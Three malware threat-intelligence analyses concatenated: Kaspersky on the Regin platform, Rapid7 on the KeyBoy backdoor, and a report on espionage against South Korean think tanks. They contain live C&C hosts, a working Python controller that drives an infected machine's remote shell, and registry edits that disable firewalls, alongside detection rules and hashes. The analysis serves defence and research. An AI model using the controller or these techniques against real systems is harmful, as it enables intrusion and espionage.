The victims of Regin fall into the following categories : • Telecom operators • Government institutions • Multinational political bodies • Financial institutions • Research institutions • Individuals involved in advanced mathematical / cryptographic research So far , we ' ve observed two main objectives of the attackers : • Intelligence gathering • Facilitating other types of attacks While in most cases the attackers were focused on extracting sensitive information such as emails and other elec- tronic documents , we have observed cases where the attackers compromised telecom operators to enable the launch of additional sophisticated attacks .
This is discussed in detail in the GSM attacks section , below .
Perhaps one of the most well - known victims of Regin was Jean Jacques Quisquater ( https : //en.wikipedia.org/ wiki / Jean - Jacques_Quisquater ) , a well - known Belgian cryptographer .
In February 2014 , Quisquater announced he was the victim of a sophisticated cyber - intrusion incident .
We were able to obtain samples from the Quisquater case and confirm they belong to the Regin platform .
Another victim of Regin was a computer we call the ' Magnet of Threats ' .
The computer belongs to a certain research institution and , besides Regin , it has been attacked by Animal Farm , Itaduke , Mask / Careto , Turla , and some other advanced threats that do not have public names , all co - existing happily on the same computer at some point .
The exact method used for the initial compromise remains a mystery , although several theories exist , including use of man - in - the - middle attacks with browser zero - day exploits .
For some of the victims we observed tools and modules designed for lateral movement .
So far we have not encountered any exploits .
The replication modules are copied to remote computers using Windows administrative shares and then executed .
Obviously this tech- nique requires administrative privileges inside the victim 's network .
In several cases the infected machines were also Windows domain controllers .
Targeting of system administrators via web - based exploits is a simple way of achieving immediate administrative access to the entire network .
Although some private research groups refer to it as the ' Regin malware ' , it is not entirely accurate to use the term malware in this case .
In essence , Regin is a cyberattack platform , which the attackers deploy in victim networks for total remote control at all levels .
The platform is extremely modular in nature and has multiple stages .
In general , the first samples victims detect in their networks are stage 1 loaders .
These are the easiest to notice because they are the only executables that exist directly on the victim 's computer .
These samples use an odd technique to load the next stages , which until recently was unique to Regin .
Inter- estingly , in mid-2012 , the ZeroAccess gang implemented a very similar loading mechanism , which possibly suggests it learned about Regin and its unique features .
( See http : //www.symantec.com / connect / blogs/ trojanzeroaccessc - hidden - ntfs - ea ) .
The particular feature used ( or abused ) by Regin to hide its next stages is called NTFS Extended Attributes ( EA ) .
Originally , these were implemented in Windows NT for compatibility with OS/2 applications ; however , they made their way into later versions of Windows , namely 2000 , XP and Vista .
The malware hides its modules in NTFS EAs , splitting large files into several blocks of limited size .
These are dynamically joined , decrypted and executed in memory .
Most of the stage 1 samples we have seen appear to have been built on top of other source code projects , which are ' piggybacked ' ; for instance , the Ser8UART project : http : //www.mirrorservice.org / sites / downloads.sourceforge.net / s / se / ser8uart - driver / ser8uart - driver/ Ser8UART % 20 % 201.1.2.1/ .
For instance , the Regin loader with md5 01c2f321b6bfdb9473c079b0797567ba was built on top of the Ser8UART source code .
A careful examination however spots the encrypted configuration block at offset 0x5600 .
We can assume the attackers take various low - level open - source projects or Windows DDK source codes and merge them together with their malicious loader .
Hence , each stage 1 loader looks very different from others , as it contains random useless code from various other programs .
This technique makes it more difficult to build reliable detection for the loaders .
Despite the differences , all stage 1 samples are similar in functionality .
They contain an encrypted config block that points to the next stages : Once decrypted , the block contains several folder names and registry key names : In the example above , the stage 1 tries to load a second stage from the extended attributes of the system direc- tory specified in the configuration block ( in our case , the WINDOWS folder ) .
It also tries to read additional data from the EAs of the second directory ( in our case , the WINDOWS\fonts directory ) .
The second attribute value is optional and may have been used to overcome size limitations .
If the first EA data block is missing , the module also tries to read the complete body of the 2nd stage from a registry value using the key and value names from the configuration block .
The body of the second stage is encrypted with one of two algorithms that are simple variations of XOR , and is supposed to be a PE file .
The first stage loads that file in memory and calls its entry point function .
The 64-bit variant works in a slightly different way .
Instead of storing the 2nd stage in the registry or extended attributes , the attackers preferred to store it after the end of the last partition on disk .
Known filenames for the 64-bit stage 1 : • system32\wsharp.dll – detected on a victim machine in Germany • system32\wshnetc.dll – detected on a victim machine in Belgium All the stage 1 modules for 64-bit systems were signed with fake digital certificates .
The two fake certificates we identified are supposed to belong to Microsoft Corporation and Broadcom Corporation .
During the infection phase , the attackers inject a trusted CA in the certificates chain , which instructs the system to trust their signatures .
Here is what the hard drive of a 64-bit system infected with Regin looks like : Interestingly , while the 32-bit Regin stage 1 runs in kernel mode , on 64-bit systems the attacker code starts in user mode .
This is perhaps due to the fact that it is more difficult to run kernel mode on modern Windows 64-bit systems .
The second stage for 32-bit systems is implemented as a driver module .
It has a configuration block encrypted in a similar way to the first stage module .
The configuration block contains the names of two system directories that hold the encrypted third stage in their extended attributes .
It also has the name of a registry value that may hold the body of the third stage in case the EAs are missing ( for computers with a FAT / FAT32-formatted system disk ) .
Once the encrypted third stage is read from the registry or NTFS EAs , it is decrypted using the RC5 algorithm and a fixed 16-byte key that is hardcoded in the second stage .
Then , it is decompressed using the NRV2e algo- rithm from the open - source UCL library .
The second stage module loads the resulting binary in memory , vali- dates that it is a valid PE file , and calls its entry point in a system thread .
The second stage also creates a marker file that can be used to identify the infected machine .
Known filenames for this marker are : • % SYSTEMROOT % \system32\nsreg1.dat • % SYSTEMROOT % \system32\bssec3.dat • % SYSTEMROOT % \system32\msrdc64.dat These files have their timestamp set to the timestamp of the system file ' % SYSTEMROOT % \system32\lsass.exe ' The second stage has additional code for removing the startup code of Regin if signaled by the third stage .
Its configuration data contains the locations of the first three stages , including registry keys , names of the directo- ries that hold the encrypted EAs , and the location of the initial driver .
Essentially , the second stage can remove all the Regin stages from the system , effectively cleaning the machine and leaving only the encrypted VFS behind .
The 64-bit version of the second stage loader is a PE DLL module , since the 64-bit bootstrap chain operates in user mode .
Just like the first stage , it loads the encrypted body of the next stage from the end of the physical disk and decrypts it with a hardcoded RC5 key , then decompresses it using the nrv2 algorithm from the UCL library .
After decryption and decompression , the code checks if the next stage is a Windows PE DLL module , and if it is , it loads and executes it .
On 32-bit systems , the third stage is implemented as a driver module and provides the basic functionality of the malicious framework .
It is responsible for operating the encrypted virtual file system and loading additional plugins , and also provides several built - in plugins for the entire framework .
The module initializes the framework , sets up the plugin system and starts the actual work cycle of the malware .
It also passes execution to the plugin i d 50221 that is loaded from the VFS .
Built - in plugins provided by this module are : On 64-bit Windows systems , stage 3 is missing .
Stage 2 loads the dispatcher directly from the disk and runs it .
32-bit 64-bit The dispatcher library is the user - mode core of the framework .
It is loaded directly as the third stage of the 64-bit bootstrap process , or extracted and loaded from the VFS as module 50221 as the fourth stage on 32-bit systems .
It implements a set of internal plugins : The dispatcher takes care of the most complicated tasks of the Regin platform , such as providing an API to access virtual file systems , basic communications and storage functions , as well as network transport sub- routines .
In essence , the dispatcher is the brain that runs the entire platform .
The most interesting code from the Regin platform is stored in encrypted file storages , known as Virtual File Systems ( VFSes ) .
During our analysis we were able to obtain 24 VFSes from multiple victims around the world .
Generally , these have random names and can be located in several places in the infected system : Each VFS has a structure that is very similar to a real disk file system such as FAT .
The VFS files start with a header that provides basic information required to operate the file system .
The header is followed by the bitmap of used/ free sectors and then by the file table .
Files are described by file table entries : Each sector starts with a 32-bit integer that is the offset of the next sector of the file .
• File record at offset 0x122 , file ID 50221 , offset of the first sector 0x7B13 • Sector at 0x7B13 , next sector at 0x7D13 • Sector at 0x7D13 , next sector at 0x7F13 , • Sector at 0x7F13 , next sector at 0x8113 , etc .
Although the structures of the file system are unencrypted , the file entries are encrypted .
The encryption algo- rithm used is RC5 , and many records are also compressed using the nrv2e algorithm from the UCL library .
UCL is an open source implementation of the proprietary NRV ( ' Not Really Vanished ' ) compression algorithm , and was originally used by the UPX tool .
The reason why the attackers chose UCL is simple : it 's small , compact and requires little to no additional memory for decompression .
Each VFS we encountered was encrypted with a 16 bytes key , which can vary from victim to victim .
Based on our experience , most files were however encrypted with the same key , { 73 23 1F 43 93 E1 9F 2F 99 0C 17 81 5C FF B4 01 } stored in the dispatcher module or VMEM.sys kernel core .
In all , we observed about a dozen different VFS keys .
The following plugins were observed inside the VFSes we collected .
These are all identified by a 16-bit number .
The plugins are referenced by these numbers ; they are like filenames on a normal file system and allow the dispatcher to easily load or reference them .
The binary modules are referenced by these numbers as plugin identifiers and usually have similar internal DLL names ; e.g. , the plugin with ID ' 50121 ' will have the internal name ' 50121.dll ' in its export table .
Compressed binary modules are accompanied by binary files with the same ID .
These files contain the size of the decom- pressed module and are not included in the description .
Known data blocks and their configuration IDs : Known executable modules and their plugin IDs : The attackers can dynamically add and delete plugins inside the VFS and each victim installation has a different set of plugins depending on the type of activity the attackers need to execute .
For example , only some of the VFSes we have seen had lateral movement modules , designed for infecting other computers in the network .
In this section we describe some of the most interesting findings about Regin .
With high - end APT groups such as the one behind Regin , mistakes are very rare .
Nevertheless , they do happen .
Some of the VFSes we analyzed contain words that appear to be the respective codenames of the modules deployed on the victim : • legspinv2.6 and LEGSPINv2.6 • WILLISCHECKv2.0 • HOPSCOTCH Another module we found , which is a plugin type 55001.0 , references U_STARBUCKS : Finally , the word ' shit ' appears in many places throughout the code and modules .
The most interesting aspect we have found so far regarding Regin relates to an infection of a large GSM operator .
One VFS encrypted entry we located had internal i d 50049.2 , and appears to be an activity log on a GSM Base Station Controller .
According to the GSM documentation ( http : //www.telecomabc.com / b / bsc.html ) : ' The Base Station Controller ( BSC ) is in control of and supervises a number of Base Transceiver Stations ( BTS ) .
The BSC is responsible for the allocation of radio resources to a mobile call and for the handovers that are made between base stations under his control .
Other handovers are under the control of the MSC .
' Here 's a look at the decoded Regin GSM activity log : This log is about 70 KB in size and contains hundreds of entries like the ones above .
It also includes timestamps that indicate exactly when the command was executed .
The entries in the log appear to contain Ericsson OSS MML ( Man - Machine Language as defined by ITU - T ) commands ( see https : //en.wikipedia.org / wiki / Operations_support_system ) .
Here 's a list of some commands issued on the Base Station Controller , together with some of their timestamps : Descriptions for the commands : In total , the log indicates that commands were executed on 136 different cells .
Some of the cell names include ' prn021a , gzn010a , wdk004 , kbl027a , etc ...
' .
The command log we obtained covers a period of about one month , from April 25 , 2008 through May 27 , 2008 .
It is unknown why the commands stopped in May 2008 though ; perhaps the infection was removed or the attackers achieved their objective and moved on .
Another explanation is that the attackers improved or changed the malware to stop saving logs locally and that is why only some older logs were discovered .
The C & C mechanism implemented in Regin is extremely sophisticated and relies on communication drones deployed by the attackers throughout the victim networks .
Most victims communicate with another machine in their own internal network through various protocols as specified in the config file .
These include HTTP and Windows network pipes .
The purpose of such a complex infrastructure is to achieve two goals : ( i ) to give attackers access deep into the network , potentially bypassing air gaps ; and ( ii ) to restrict as much as possible the traffic to the C & C .
Here 's a look at the decoded configurations : : In the above table we see configurations extracted from several victims that bridge together infected machines in what appears to be virtual networks : 17.3.40.x , 50.103.14.x , 51.9.1.x , 18.159.0.x .
One of these routes reaches out to the ' external ' C & C server at 203.199.89.80 .
The numbers right after the ' transport ' indicate the plugin that handles the communication .
These are in our case : • 27 - ICMP network listener using raw sockets • 50035 - Winsock - based network transport • 50037 - Network transport over HTTP • 50051 - Network transport over HTTPS • 50271 - Network transport over SMB ( named pipes ) The machines located on the border of the network act as routers , effectively connecting victims from inside the network with C & Cs on the Internet .
After decoding all the configurations we have collected , we were able to identify the following external C & Cs .
One particular case includes a country in the Middle East .
It was rather astonishing , so we thought it should be mentioned .
In this country all the victims we identified communicate with each other , forming a peer - to - peer network .
The P2P network includes the president 's office , a research center , an educational institution network and a bank .
Spread across the country , these victims are all interconnected with each other .
One of the victims contains a translation drone , which has the ability to forward packets outside the country , to the C & C in India .
This represents a rather interesting command - and - control mechanism , which is guaranteed to raise little suspi- cion .
For instance , if all commands to the president 's office are sent through the bank 's network , then all the malicious traffic visible to the president 's office sysadmins will only be with the bank , in the same country .
Over the past two years we have been collecting statistics on the attacks and victims of Regin .
These were aided by the fact that even after the malware is uninstalled , certain artifacts are left behind , which can help identify an infected ( but cleaned ) system .
For instance , we have seen several cases where the systems were cleaned but the ' msrdc64.dat ' infection marker was left behind .
So far , victims of Regin have been identified in 14 countries : • Afghanistan • Indonesia • Algeria • Iran • Belgium • Kiribati • Brazil • Malaysia • Fiji • Pakistan • Germany • Russia • India • Syria In total , we counted 27 different victims , although it should be pointed out that the definition of a victim here refers to a full entity , including its entire network .
The number of unique PCs infected with Regin is of course much , much higher .
From the map above , Fiji and Kiribati are unusual , because we rarely see such advanced malware in such remote , tiny countries .
In particular , the victim in Kiribati is most unusual .
To put this into context , Kiribati is a small island in the Pacific with a population around 100,000 .
According to experts , Kiribati is probably going to become one of the first victims of global warming , as it will be under water by 2050 .
( http : //www.businessin- sider.com/pacific-island-nation-kiribati-sinking-2014-5 ? op=1 ) Considering the complexity and cost of Regin 's development , it is likely that this operation is supported by a nation state .
While attribution remains a very difficult problem when it comes to professional attackers such as the ones behind Regin , certain metadata extracted from the samples is still worth a look .
We have collected timestamps from samples , which are normally put automatically by the development software : As this information could be easily altered by the developers , it is up to the reader to attempt to interpret this : as an intentional false flag , or a non - critical indicator left by the developers .
More information about Regin is available to Kaspersky Intelligent Services ' clients .
Contact : intelreports @ kaspersky.com For more than a decade , a sophisticated group known as Regin has targeted high - profile entities around the world with an advanced malware platform .
As far as we can tell , the operation is still active , although the malware may have been upgraded to more sophisticated versions .
The most recent sample we have seen was from a 64-bit infection .
This infection was still active in the spring of 2014 .
The name Regin is apparently a switched around ' In Reg ' , short for ' In Registry ' , as the malware can store its modules in the registry .
This name and the detections first appeared in anti - malware products around March 2011 .
In some ways the platform reminds us of another sophisticated malware : Turla ( http : //securelist.com / analysis/ publications/65545/the - epic - turla - operation/ ) .
Some similarities include the use of virtual file systems and the deployment of communication drones to bridge networks together .
Yet through their implementation , coding methods , plugins , hiding techniques and flexibility , Regin surpasses Turla as one of the most sophisticated attack platforms we have ever analyzed .
The ability of this group to penetrate and monitor GSM networks is perhaps the most unusual and interesting aspect of these operations .
In today 's world , we have become too dependent on cellphone networks that rely on ancient communication protocols with little or no security available for the end user .
Although all GSM networks have mechanisms embedded that allow entities such as law enforcement to track suspects , there are other parties which can gain this ability and then abuse it to launch other types of attacks against mobile users .
Kaspersky Lab products detect modules from the Regin platform as : Trojan . Win32.Regin.gen and Rootkit . Win32.Regin .
If you detect a Regin infection in your network , contact us at : intelservices @ kaspersky.com Stage 1 files , 32 bit : 06665b96e293b23acc80451abb413e50 187044596bc1328efa0ed636d8aa4a5c 1c024e599ac055312a4ab75b3950040a 2c8b9d2885543d7ade3cae98225e263b 4b6b86c7fec1c574706cecedf44abded 6662c390b2bbbd291ec7987388fc75d7 b269894f434657db2b15949641a67532 b29ca4f22ae7b7b25f79c1d4a421139d b505d65721bb2453d5039a389113b566 26297dc3cd0b688de3b846983c5385e5 ba7bb65634ce1e30c1e5415be3d1db1d bfbe8c3ee78750c3a520480700e440f8 d240f06e98c8d3e647cbf4d442d79475 ffb0b9b5b610191051a7bdf0806e1e47 Unusual stage 1 files apparently compiled from various public source codes merged with malicious code : 01c2f321b6bfdb9473c079b0797567ba 47d0e8f9d7a6429920329207a32ecc2e 744c07e886497f7b68f6f7fe57b7ab54 db405ad775ac887a337b02ea8b07fddc Stage 1 , 64-bit system infection : bddf5afbea2d0eed77f2ad4e9a4f044d c053a0a3f1edcbbfc9b51bc640e808ce e63422e458afdfe111bd0b87c1e9772c Stage 2 , 32 bit : 18d4898d82fcb290dfed2a9f70d66833 b9e4f9d32ce59e7c4daf6b237c330e25 Stage 2 , 64 bit : d446b1ed24dad48311f287f3c65aeb80 Stage 3 , 32 bit : 8486ec3112e322f9f468bdea3005d7b5 da03648948475b2d0e3e2345d7a9bbbb Stage 4 32 bit : 1e4076caa08e41a5befc52efd74819ea 68297fde98e9c0c29cecc0ebf38bde95 6cf5dc32e1f6959e7354e85101ec219a 885dcd517faf9fac655b8da66315462d a1d727340158ec0af81a845abd3963c1 Stage 4 64 bit : de3547375fbf5f4cb4b14d53f413c503 Note : Stages 2,3 and 4 do not appear on infected systems as real files on disk .
Hashes are provided for research purposes only .
• \REGISTRY\Machine\System\CurrentControlSet\Control\RestoreList • \REGISTRY\Machine\System\CurrentControlSet\Control\Class\ { 39399744 - 44FC - AD65 - 474B - E4DDF- 8C7FB97 } • \REGISTRY\Machine\System\CurrentControlSet\Control\Class\ { 3F90B1B4 - 58E2 - 251E-6FFE- 4D38C5631A04 } • \REGISTRY\Machine\System\CurrentControlSet\Control\Class\ { 4F20E605 - 9452 - 4787-B793- D0204917CA58 } • \REGISTRY\Machine\System\CurrentControlSet\Control\Class\ { 9B9A8ADB-8864 - 4BC4 - 8AD5- B17DFDBB9F58 } This algorithm is used throughout the code and is referenced as RC5 in the document , although the implemen- tation and the way the cipher is invoked is specific to Regin .
In our never - ending quest to spot and expose the nastiest of the Internet , me and Mark this time incidentally stepped into a targeted attacks campaign apparently directed at a distributed and diversified base of victims .
In this blog post we 'll analyze two specific incidents apparently targeting victims in Vietnam and in India and we 'll describe the capabilities of the custom backdoor being used that for convenience ( and to our knowledge , for a lack of an existing name ) we call KeyBoy , due to a string present in one of the samples .
We 'll describe how the attackers operate these backdoors , provide some scripts useful to further investigate the campaign as well as meanings to detect infections or scout for additional samples .
We encountered the first document exploit called `` THAM luan- GD- NCKH2.doc '' a few days ago , which appears to be leveraging some vulnerabilities patched with MS12 - 060 .
When opened with a vulnerable version of Microsoft Word , the exploit will initiate the infection routine and display the legitimate document that follows : This document , written in Vietnamese , appears to be reviewing and discussing best practices for teaching and researching scientific topics .
We have no knowledge on the identity of the target , but we can assume he might part of the Vietnamese academic community .
The document is named to Nguyen Anh Tuan , which is presented as author of this crafted text .
Following are the hashes of the exploit file : THAM luan- GD- NCKH2.doc When executed the exploit initially creates and launches a dropper at location % Temp % \svchost.exe with the following hashes : svchost.exe This payload then creates a DLL file in system32 called CREDRIVER.dll , which is in fact the actual backdoor : CREDRIVER.dll We also identified another document exploiting CVE-2012 - 0158 , but this time apparently targeting some Indian individuals .
The content of the document is the following : This time the bait appears to be related to the state of telecommunication infrastructure in the district of Calcutta in India , discussing the coverage of GSM networks and availability and stability of broadband connections .
Also for this intrusion we ca n't know the identity of the target , but our hypothesis is either someone in the telecommunications industry or a representative of the local government .
In this case this crafted document pretends to be authored by someone called Amir Kumar Gupta .
All backdoors appear to be compiled on April 1st 2013 , suggesting that the attacks are reasonably recent .
For the sake of this analysis we 'll take the Vietnamese backdoor as an example ; the one found in the Indian attack operates in the exact same way .
As mentioned , when the exploit is opened a dropper is created and launched , which then takes care of creating a Windows service called MdAdum , which is then visible in the registry as follows : The dropper then launches the service with the DLL located at C : \WINDOWS\system32\CREDRIVER.dll and deletes itself .
Resilience on the system is guaranteed by the use of such service which will be executed at every start up .
Note that the Indian attack does not make use of this middle - stage dropper , but directly installs and launches the Windows service instead .
This backdoor has several features including : 1 .
Steal credentials from Internet Explorer 2 .
Steal credentials from Mozilla Firefox 3 .
Install a keylogger for intercepting credentials on Google Chrome 4 .
Operate in an interactive mode to allow the attacker to perform additional investigation on the compromised system and exfiltrate data .
Following you can see the portion of the code where the backdoor , after having verified which version of Mozilla Firefox is installed on the system , decides which technique to use to recover the credentials from the browser 's local storage .
In older versions of Firefox , credentials were stored in several .txt
files in % AppData % \Mozilla\Firefox , while in most recent ones they are stored in a SQLite database .
In the following snipped you see the SQL statement to extract the data : Just in the same way , the backdoor attempts to collect password autocomplete from Internet Explorer : The backdoor also creates a separate thread that installs a Windows hook procedure on message WH_KEYBOARD_LL , through which it can intercept keystrokes .
We believe this is mainly used to intercept credentials from other browsers , specifically Google Chrome : The backdoor tries to contact the following domains until it gets a response from an active one : silence.phdns01.com cpnet.phmail.us imlang.phmail.org The Indian backdoor tries to contact the following domains instead : cresy.zyns.com preter.epac.to backto.ddns.name In the first set of domains they are either registered with Whois proxy services or with fake identities .
In the second set they are making use of a dynamic DNS service by ChangeIP.com .
Following are traces collected from passive DNS data relevant to the hosts involved in these attacks : This is an initial request that the backdoor would send out on port 443 to an active C & C : 00000000 c4 4c 87 3f 11 1e c4 1a 2c a9 12 1a 19 61 82 de |.L .
? ...
.
, ...
.a .. |
00000010 19 26 f8 de bd 26 de 19 b0 19 1a 95 a1 dd 2b 6d | . & ...
& ...
...
.. + m|
00000020 c2 1a 82 b0 19 eb 47 b0 26 47 b0 26 20 82 eb ca | ...
...
G. & G. & ...
| 00000030 bd 26 ca 82 54 1a d0 c2 87 38 a1 20 82 b0 19 eb | . & .. T
...
.8
.
...
.|
00000040 b0 54 b0 19 1a 00 |.T ...
.|
At the time of the analysis all the C & C servers were not responding , we started reverse engineering the communication protocol and noticed that it simply used a multiply with 0x69 to encode the traffic sent to the controllers .
You can easily decode the content of the payload with the following Python snippet : The previous packet decodes to the following : $ login $ LAB 192.168.56.101 MyUser 2013/06/06 23:56:24 Proxy 20130401 While reverse engineering the backdoor we noticed that the malware expects the following messages from the C & C server it contacts : Sysinfo FileManager Download UploadFileOk Shell Intrigued by its capabilities , we started reconstructing the communication protocol and practically building a tool that would operate just like the original controller used by the attackers .
The following is a preliminary Python script that implements the protocol used by the malware and allows you to interact with it : 1 .
2 .
3 .
4 .
5 .
6 .
7 .
8 .
9 . import sys 10 . import socket 11 . import select 12 .
13 .
14 . def decode ( x ) : 15 . return ' ' .join ( [ chr ( ( ord ( i ) * 0xd9 ) & 0xff ) for i in x ] ) 16 .
17 .
18 . def encode ( x ) : 19 . return ' ' .join ( [ chr ( ( ord ( i ) * 0x93 ) & 0xff ) for i in x ] ) 20 .
21 .
22 . def main ( ) : 23 . s = socket.socket ( socket . AF_INET , socket . SOCK_STREAM ) 24 . s.setsockopt ( socket . SOL_SOCKET , socket . SO_REUSEADDR , 1 ) 25 . s.bind ( ( `` 0.0.0.0 '' , 443 ) ) 26 . s.listen ( 1 ) 27 .
28 .
29 . print `` [ * ] C & C Running on 0.0.0.0:443 '' 30 .
31 .
32 . while True : 33 . s2 , ca = s.accept ( ) 34 . print `` [ + ] New client connected : '' , ca 35 .
36 . while True : 37 . dec = `` '' 38 . rlist , wlist , xlist = select.select ( [ s2 , ] , [ ] , [ ] , 10 ) 39 . while rlist : 40 . data = s2.recv ( 2048 ) 41 . if not data : break 42 .
43 .
44 . dec = decode ( data ) 45 . print dec 46 . rlist , wlist , xlist = select.select ( [ s2 , ] , [ ] , [ ] , 2 ) 47 .
48 .
49 . if dec.startswith ( `` $ login $ '' ) : 50 . print `` [ + ] Authenticating on the bot '' 51 . s2.send ( encode ( `` login_OK '' ) + `` \x00 '' ) 52 . s2.send ( encode ( `` Refresh '' ) + `` \x00 '' ) 53 . elif dec.startswith ( `` OnLine '' ) : 54 . s2.send ( encode ( `` test '' ) + `` \x00 '' ) 55 . else : 56 . cmd = raw_input ( `` shell > `` ) .strip
( ) 57 . s2.send ( encode ( cmd ) + '' \x00 '' ) 58 .
59 .
60 . s2.close ( ) 61 .
62 .
63 . s.close ( ) 64 . return 0 65 .
66 .
67 . if _ _ name _ _ = = `` _ _ main _ _ '' : 68 . try : sys.exit ( main ( ) ) 69 . except KeyboardInterrupt : pass We then launched this script and redirected the traffic coming from a system infected with KeyBoy and took control of it .
Here you can see the bot beaconing in and requiring for authentication ( funny enough the password is '' test '' , while the Indian sample uses `` dns.com '' ) : [ * ] C & C Running on 0.0.0.0:443 [ + ] New client connected : ( ' 192.168.56.110 ' , 1443 ) $ login $ LAB 192.168.56.110 MyUser 2013/06/07 02:18:35 Proxy 20130401 [ + ] Authenticating on the bot OnLine Pw_OK When the authentication is confirmed , we are prompted with a shell through which we can interact in real - time with the bot .
The messages we previously identified represent the actual commands that can be sent to the bot : Sysinfo : returns detailed information on the computer ( pretty much the output of systeminfo ) ; the bot will respond with a message with the header $ sysinfo $ .
FileManager : interact with all the disks available on the victim system ; the bot will respond with a message with the header $ fileManager $ .
Download : download a file from the compromised system ; the bot will respond with a message with the header $ fileDownload $ .
UploadFileOk : upload a file to the compromised system ; the bot will respond with a message with the header $ fileUpload $ .
Most interestingly the command Shell spawns a Windows command shell that we can control remotely : shell > Shell $ shell $ Microsoft Windows XP [ Version 5.1.2600 ] ( C ) Copyright 1985 - 2001 Microsoft Corp. C : \WINDOWS\system32 > shell > tasklist $ shell $ tasklist $ shell $ C : \WINDOWS\system32 > While the interaction with the bots could also be scripted , it might be plausible that the operators of these intrusions might be interacting with their targets exclusively manually to collect different data depending on each individual they infected and the goals they had set for the attack .
While these are clearly not widespread attacks and , as in any other targeted attack case , we should not create alarmism for threats that are likely irrelevant for the majority of organizations , we want to share a few indicators that might help identify infections or assist in further research by whoever is interested in this campaign .
Firstly , thanks to the fixed patterns used by the malware in the authentication procedure , we can detect outbound traffic from infected hosts with the following simple Snort rule : alert tcp $ HOME_NET any - > $ EXTERNAL_NET any ( msg : '' KeyBoy Backdoor Login '' ; flow : to_server ; content : '' |c4 4c 87 3f 11 1e c4 1a| '' ; depth:8 ; sid:1000001 ; rev:1 ; classtype : trojan - activity ; reference : url , community.rapid7.com/community/infosec/blog/2013/06/07/keyboy-tar geted - attacks- against - vietnam - and - india ) The simplest way to identify an infection on a given Windows system , is just to look for the existence of the file C : \WINDOWS\system32\CREDRIVER.dll or of a service called MdAdum .
We also created a couple of Yara rules that you can use to scan your systems your collection of malware samples to identify copies of KeyBoy : Not a day passes by without hearing of someone hit by a targeted attack .
Recently the growth of amount and scale of targeted attacks has come to the point were they are starting to look more like opportunistic carpet bombings rather than ninja strikes .
It 's common to observe attacks pulled off successfully without any particular sophistication in place , including the incidents described in this post .
It 's also getting quite difficult to attribute the attacks to any state - sponsored unit , both because there 's a generic lack of strong evidence in such incidents ( which is why we refrained from making any statement on the origin of these intrusions ) but frankly also because almost anybody could operate such campaigns and be reasonably successful .
The only differentiation between actors at this point exclusively relies on identifying the motivations and the context .
Beware though , just because these attacks are conceptually targeted , it does n't necessarily mean that they should have a higher priority than any other threat on your security program .
Our suggestion remains the same : identify your core assets , recognize the most impactful threats to such assets and inform and protect yourself accordingly .
This research was brought to you by Claudio Guarnieri and Mark Schloesser from Rapid7 Labs .
For several months , we have been monitoring an ongoing cyber - espionage campaign against South Korean think - tanks .
There are multiple reasons why this campaign is extraordinary in its execution and logistics .
It all started one day when we encountered a somewhat unsophisticated spy program that communicated with its `` master '' via a public e - mail server .
This approach is rather inherent to many amateur virus - writers and these malware attacks are mostly ignored .
However , there were a few things that attracted our attention : The public e - mail server in question was Bulgarian - mail.bg .
The compilation path string contained Korean hieroglyphs .
These two facts compelled us take a closer look at this malware -- Korean compilers alongside Bulgarian e- mail command - and - control communications .
The complete path found in the malware presents some Korean strings : D : rsh UAC_dll ( ) Releasetest.pdb The `` rsh '' word , by all appearances , means a shortening of `` Remote Shell '' and the Korean words can be translated in English as `` attack '' and `` completion '' , i.e .
: D : rshATTACKUAC_dll ( COMPLETION ) Releasetest.pdb Although the full list of victims remains unknown , we managed to identify several targets of this campaign .
According to our technical analysis , the attackers were interested in targeting following organizations '' .
The Sejong Institute The Sejong Institute is a non - profit private organization for public interest and a leading think tank in South Korea , conducting research on national security strategy , unification strategy , regional issues , and international political economy .
Korea Institute For Defense Analyses ( KIDA ) KIDA is a comprehensive defense research institution that covers a wide range of defense - related issues .
KIDA is organized into seven research centers : the Center for Security and Strategy ; the Center for Military Planning ; the Center for Human Resource Development ; the Center for Resource Management ; the Center for Weapon Systems Studies ; the Center for Information System Studies ; and the Center for Modeling and Simulation .
KIDA also has an IT Consulting Group and various supporting departments .
KIDA 's mission is to contribute to rational defense policy - making through intensive and systematic research and analysis of defense issues .
Ministry of Unification The Ministry of Unification is an executive department of the South Korean government responsible for working towards the reunification of Korea .
Its major duties are : establishing North Korea Policy , coordinating inter - Korean dialogue , pursuing inter - Korean cooperation and educating the public on unification .
Hyundai Merchant Marine Hyundai Merchant Marine is a South Korean logistics company providing worldwide container shipping services .
Some clues also suggest that computers belonging to `` The supporters of Korean Unification '' ( http : //www.unihope.kr/ ) were also targeted .
Among the organizations we counted , 11 are based in South Korea and two entities reside in China .
Partly because this campaign is very limited and highly targeted , we have not yet been able to identify how this malware is being distributed .
The malicious samples we found are the early stage malware most often delivered by spear - phishing e - mails .
The initial Trojan dropper is a Dynamic Link Library functioning as a loader for further malware .
It does not maintain exports and simply delivers another encrypted library maintained in its resource section .
This second library performs all the espionage functionality .
When running on Windows 7 , the malicious library uses the Metasploit Framework 's open - source code Win7Elevate to inject malicious code into explorer.exe .
In any case , be it Windows 7 or not , this malicious code decrypts its spying library from resources , saves it to disk with an apparently random but hardcoded name , for example , ~DFE8B437DD7C417A6D.TMP , in the user 's temporary folder and loads this file as library .
This next stage library copies itself into the System32 directory of the Windows folder after the hardcoded file name -- either KBDLV2.DLL or AUTO.DLL , depending on the malware sample .
Then the service is created for the service dll .
Service names also can differ from version to version ; we discovered the following names -- DriverManage , WebService and WebClientManager .
These functions assure malware persistence in a compromised OS between system reboots .
At this stage , the malware gathers information about the infected computer .
This includes an output of the systeminfo command saved in the file oledvbs.inc by following the hardcoded path : C : Program FilesCommon FilesSystemOle DBoledvbs.inc .
There is another function called - the malware creates a string containing computer and user names but this is n't used anywhere .
By all appearances , this is a mistake by the malware author .
Later on , we will come to a function where such a string could be pertinent but the malware is not able to find this data in the place where it should be .
These steps are taken only if it 's running on an infected system for the first time .
At system startup , the malicious library performs spying activities when it confirms that it is loaded by the generic svchost.exe process .
There are a lot of malicious programs involved in this campaign but , strangely , they each implement a single spying function .
Besides the basic library ( KBDLV2.DLL / AUTO.DLL ) that is responsible for common communication with its campaign master , we were able to find modules performing the following functions : Keystroke logging Directory listing collection HWP document theft Remote control download and execution Remote control access At system startup , the basic library disables the system firewall and any AhnLab firewall ( a South Korean security product vendor ) by zeroing out related values in registry : SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyStandardProfile EnableFirewall = 0 SYSTEMCurrentControlSetServicesSharedAccessParameters FirewallPolicyPublicProfile EnableFirewall = 0 HKLMSOFTWAREAhnLabV3IS2007InternetSec FWRunMode = 0 HKLMSOFTWAREAhnlabV3IS80is fwmode = 0 It also turns off the Windows Security Center service to prevent alerting the user about the disabled firewall .
